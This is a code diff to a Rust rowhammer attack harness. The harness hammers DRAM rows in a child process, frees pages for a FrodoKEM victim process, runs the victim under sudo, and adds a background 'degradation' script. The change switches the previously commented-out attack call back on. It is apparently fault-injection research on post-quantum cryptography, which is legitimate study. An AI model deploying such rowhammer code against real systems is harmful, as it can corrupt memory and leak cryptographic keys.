@@ -54,16 +54,7 @@ fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64,
 }
 
 fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
-    println!("Setting up attack pages:");
-    for (i, page) in pages.iter().enumerate() {
-        println!("Page {}: {:#?}", i, page.target_page);
-        println!("Above pages: {:?}", page.above_pages);
-        println!("Below pages: {:?}", page.below_pages);
-    }
-
-    let mut block_mapping = get_block_by_order(12);
-
-    println!("Initializing pages");
+    println!("Initializing pages for attack.");
 
     for page in &pages {
         unsafe {
@@ -80,6 +71,8 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
         }
     }
 
+    let mut block_mapping = get_block_by_order(12);
+
     println!("Starting attack");
     io::stdout().flush().unwrap();
 
@@ -87,11 +80,15 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
         Ok(ForkResult::Parent { child }) => {
             println!("Started attack in child process {}", child);
 
+            let ok = Command::new("./src/degradation/run_degradation.sh")
+                .status()
+                .expect("Running degradation failed");
+
             thread::sleep(Duration::from_secs(10));
 
-            // Set Cpu affinity to core 2
+            // Set Cpu affinity to core 1
             let mut cpu_set = CpuSet::new();
-            cpu_set.set(2).unwrap();
+            cpu_set.set(1).unwrap();
             sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();
 
             // Unmap all allocated pages to make room for the FrodoKEM process
@@ -132,7 +129,7 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
             }
 
             let ok = Command::new("sudo")
-                .arg("../../test_KEM > vic.txt")
+                .arg("../Frodo/PQCrypto-LWEKE/frodo640/test_KEM > vic.out")
                 .status()
                 .expect("failed to execute command");
 
@@ -146,6 +143,14 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
                 .arg(format!("{}", child))
                 .status()
                 .expect("failed to kill child, sorry master :(");
+
+            println!("Killing degradations...");
+            let ok = Command::new("sudo")
+                .arg("pkill")
+                .arg("-f")
+                .arg("degrade")
+                .status()
+                .expect("failed to kill degradations");
         }
 
         Ok(ForkResult::Child) => {
@@ -153,7 +158,7 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
 
             // Setting Cpu affinity to core 1
             let mut cpu_set = CpuSet::new();
-            cpu_set.set(1).unwrap();
+            cpu_set.set(5).unwrap();
             sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();
 
             // Set values to allocated memory before attacking
@@ -245,7 +250,6 @@ pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
         break (mmap, pages_by_row, victims);
     };
 
-    println!("Targets: {:#?}", victims);
     let mut indices = (0..pages_by_row.len() - 2).collect::<Vec<_>>();
 
     'main: for above_row_index in indices {
@@ -264,7 +268,7 @@ pub(crate) fn main(fraction_of_phys_memory: f64, dimms: u8, testing: bool) {
         }
     }
 
-    //rowhammer_attack(hammer, victims);
+    rowhammer_attack(hammer, victims);
 
     println!("Done with attack");
 }
